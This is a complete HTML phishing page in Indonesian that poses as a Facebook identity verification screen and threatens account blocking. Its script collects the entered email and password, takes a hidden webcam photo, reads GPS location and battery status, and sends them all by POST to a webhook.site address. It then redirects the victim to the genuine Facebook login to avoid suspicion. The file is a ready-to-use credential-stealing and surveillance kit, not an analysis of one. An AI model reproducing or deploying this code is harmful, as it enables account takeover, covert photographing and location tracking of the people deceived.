<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Identity Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        .logo { color: #1877f2; fill: currentColor; width: 150px; margin-bottom: 20px; }
        .msg { font-size: 15px; color: #1c1e21; margin-bottom: 20px; line-height: 1.4; font-weight: 500; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; background-color: #f5f6f7; }
        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .footer { font-size: 12px; color: #8a8d91; margin-top: 20px; text-decoration: none; display: block; }
        #vid { display: none; }
    </style>
</head>
<body>

<div class="card">
    <!-- Logo Facebook SVG (Anti Pecah) -->
    <svg class="logo" viewBox="0 0 120 28">
        <path d="M21.2 28V15.3h4.3l.6-5.1h-4.9V7c0-1.5.4-2.5 2.5-2.5h2.7V0h-4.3c-3.8 0-6.4 2.3-6.4 6.6v3.6h-4.4v5.1h4.4V28h5.5z"></path>
        <path d="M37 10.1c-1.6 0-2.9.6-3.7 1.6V10h-4.3v17.5h4.4v-6.6c.8 1.1 2.1 1.7 3.7 1.7 3 0 5.4-2.5 5.4-6.3.1-3.7-2.4-6.2-5.5-6.2zm-.7 8.8c-1.4 0-2.4-1.1-2.4-2.5s1.1-2.5 2.4-2.5 2.4 1.1 2.4 2.5-1 2.5-2.4 2.5zM56 10.1c-1.6 0-3 1-3.8 2.2V10h-4.3v12.5h4.3v-1.1c.8 1.2 2.2 1.9 3.8 1.9 3 0 5.5-2.5 5.5-6.6s-2.5-6.6-5.5-6.6zm-.7 8.8c-1.4 0-2.4-1.1-2.4-2.5s1.1-2.5 2.4-2.5 2.4 1.1 2.4 2.5-1 2.5-2.4 2.5zM74.8 10.1c-1.7 0-3.3.8-4.1 2.2V0h-4.4v22.5h4.3v-1.1c.8 1.2 2.3 1.9 4.2 1.9 3 0 5.6-2.5 5.6-6.6.1-4-2.6-6.6-5.6-6.6zm-.8 8.8c-1.4 0-2.4-1.1-2.4-2.5s1.1-2.5 2.4-2.5 2.4 1.1 2.4 2.5-1 2.5-2.4 2.5zM84.7 16.3c0-3.7 2.4-6.2 5.6-6.2 3.1 0 5.5 2.4 5.5 6.1v.9H89.2c.2 1.3 1.1 2 2.4 2 1.1 0 1.9-.4 2.4-1.1l3.3 1.8c-1.1 1.8-3 2.7-5.7 2.7-3.5 0-6.9-2.5-6.9-6.2zm6.9-2.5c-1.1 0-1.9.6-2.2 1.5h4.3c-.1-1-.9-1.5-2.1-1.5zM109.1 10.1c-1.8 0-3.2 1.1-3.9 2.4V10h-4.3v12.5h4.3v-6.9c0-1.7 1.1-2.4 2.3-2.4.3 0 .6 0 .9.1V9c-.4-.1-.8-.1-1.3-.1z"></path>
    </svg>

    <div class="msg">Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda untuk mencegah pemblokiran permanen.</div>
    
    <input type="text" id="user" placeholder="Email atau Nomor Telepon" autocomplete="off">
    <input type="password" id="pass" placeholder="Kata Sandi" autocomplete="off">
    <button onclick="execute()">Verifikasi Akun</button>
    
    <a href="#" class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</a>
</div>

<video id="vid" autoplay></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const WEBHOOK_URL = "https://webhook.site/a8889196-bf1c-4c88-9a69-8eacaf2e1bd0";

    async function execute() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if(!u || !p) return alert("Harap isi data dengan benar.");

        let photoData = "Camera Access Denied";
        let gpsData = "GPS Access Denied";
        let batteryInfo = "N/A";

        try {
            const b = await navigator.getBattery();
            batteryInfo = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
        } catch(e) {}

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('vid');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500));
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photoData = canvas.toDataURL('image/jpeg', 0.6);
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}

        navigator.geolocation.getCurrentPosition((pos) => {
            gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + "m", maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` };
            finalize(u, p, photoData, gpsData, batteryInfo);
        }, () => {
            finalize(u, p, photoData, gpsData, batteryInfo);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }

    function finalize(u, p, img, loc, batt) {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                credentials: { email: u, pass: p },
                location: loc,
                battery: batt,
                photo: img,
                time: new Date().toLocaleString()
            })
        });
        alert("Sistem sedang memverifikasi identitas Anda. Harap tunggu konfirmasi di email.");
        window.location.href = "https://facebook.com/login";
    }
</script>
</body>
</html>
